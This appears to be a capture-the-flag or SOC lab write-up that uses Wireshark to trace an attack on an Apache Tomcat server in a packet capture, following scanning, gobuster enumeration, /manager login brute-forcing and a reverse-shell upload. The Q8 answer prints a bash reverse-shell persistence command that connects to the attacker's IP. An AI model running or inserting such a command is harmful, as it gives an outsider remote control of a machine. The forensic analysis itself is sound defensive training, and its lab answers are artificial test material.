# Analyze network traffic using Wireshark's custom columns, filters, and statistics to identify suspicious web server administration access and potential compromise.
<img width="1329" height="355" alt="image" src="https://github.com/user-attachments/assets/b9e8d6e9-c88a-41e1-af0f-ca0a26d5dd2c" />

## The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.
<img width="343" height="94" alt="image" src="https://github.com/user-attachments/assets/3a5f705b-4b66-4b19-95cf-393f94f00e6c" />

## Q1. Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?  
Open the PCAP file to identify the attacker's source IP address. Click Statistics > Conversations. Then, click the TCP section. Here's what the PCAP file looks like.
<img width="1386" height="83" alt="image" src="https://github.com/user-attachments/assets/1699f4cf-4d4b-47f8-a72a-7c250c08278c" />
14.0.0.120 is an external IP. It has 19607 requests, which is the main reason it is suspicious.

## Q2. Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?  
By using “https://whatismyipaddress.com/” to search about the IP address 14.0.0.120 the country is China.
<img width="939" height="496" alt="image" src="https://github.com/user-attachments/assets/ac783ec5-d28e-4f11-92de-506dbe77dac0" />

## Q3. From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?  
Usually HTTP protocol is used to access web server so the port is 8080.
But to be precise, we need to filter the PCAP file with the command ip.src == <Attacker_IP> && http. Then, analyze one of the filtered packets. 
<img width="1411" height="494" alt="image" src="https://github.com/user-attachments/assets/8e4ab837-2448-4d00-858a-76186cec0be7" />

## Q4. Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?  
Examine the packets. We can find a lot of useful data inside this packets.
<img width="1207" height="571" alt="image" src="https://github.com/user-attachments/assets/fa896d6a-ecfe-474b-ad42-336d2295487d" />
It is very known tool for network work, gobuster.

## Q5. After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?  
Now we will focus on the http requests that return a 200 OK status after repeated 404 Not Found returns. One of them should lead to attackers interest.
<img width="1310" height="257" alt="image" src="https://github.com/user-attachments/assets/a7b48d99-6e59-4dd4-b6d1-54046f601fbd" />
We can double check in >Statictics.<img width="990" height="192" alt="image" src="https://github.com/user-attachments/assets/740711ca-39cf-4989-b986-bcbd1af7ae30" />
As we can see, attacker used /manager to upload the payload. Thus, proving our answer.

## Q6. After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?  
This packet interested me the most, because of the payload. 
<img width="1723" height="45" alt="image" src="https://github.com/user-attachments/assets/e2ab0485-af46-46b9-b13e-f7dacbc37921" />
I inspected this packet and found the answer.
<img width="1165" height="367" alt="image" src="https://github.com/user-attachments/assets/5e0b3b48-3aed-4369-9631-b9490496777a" />

## Q7. Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?  
Just inside the previous packet.
<img width="297" height="109" alt="image" src="https://github.com/user-attachments/assets/d9f9df50-9496-464e-812d-884bbc11a7de" />

## Q8. After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?
Follow the attackers steps. TCP will lead us to next step that attacker done.
<img width="119" height="68" alt="image" src="https://github.com/user-attachments/assets/2f7cca9d-f8ed-499a-820a-039959ce99dd" />
<img width="1903" height="900" alt="image" src="https://github.com/user-attachments/assets/55911afd-e027-4f51-ac50-dc764468341f" />
Just next to the payload sequence, we see the next TCP sequence that lead us to the persistence attack.
The answer is /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'

## <img width="559" height="146" alt="image" src="https://github.com/user-attachments/assets/e79e7d40-edef-4ef5-a53e-522f31267e9c" />

